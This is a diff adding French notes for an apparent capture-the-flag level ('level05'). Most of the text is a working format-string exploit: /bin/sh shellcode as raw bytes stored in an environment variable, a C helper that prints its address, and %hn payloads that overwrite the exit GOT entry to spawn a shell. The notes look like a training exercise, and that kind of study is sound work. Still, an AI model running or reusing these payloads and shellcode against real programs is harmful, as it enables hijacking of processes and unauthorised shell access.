@@ -1,0 +1,38 @@
+
+(python -c 'print "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80" + "\x90" * 3 + "\xe2\x97\x04\x08" + "\xe0\x97\x04\x08" + "%54936x%17$hn%10567x%16$hn"'; cat)
+
+ gdb x/1w 0x080497e0
+0x80497e0 <exit@got.plt>:	0xffffd6b8
+
+0xffffd91a Shellcode address in 
+
+(python -c 'print "\xe2\x97\x04\x08" + "\xe0\x97\x04\x08" + "%55570d%11$hn" + "%9957d%10$hn"'; cat) | ./level05
+
+"\xe2\x97\x04\x08" -> adresse de exit + 2
+"\xe0\x97\x04\x08" -> adresse de exit
+"%55570d%11$hn" + "%9957d%10$hn" -> adresse de notre shellcode dans l'environnement qui sera ecrit 2 bit par 2 bit 
+
+pour avoir l'adresse du shellcode dans l'environnement
+export SHELLCODE=$(python -c 'print "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"')
+
+
+On execute cette fonction pour avoir l'adresse du shelcode:
+#include <stdio.h>
+#include <stdlib.h>
+
+int main() {
+    char *addr = getenv("SHELLCODE");
+    if (addr) {
+        printf("SHELLCODE address: %p\n", addr);
+    } else {
+        printf("SHELLCODE not found\n");
+    }
+    return 0;
+}
+
+compiler avec gcc -m32 pour avoir l'adresse en 32bit et pas en 64
+
+c'est cette adresse que l'on va vouloir reecrire sur exit
+
+
+penser a recuperer les emplacements dans la stack de la ou on va ecrire
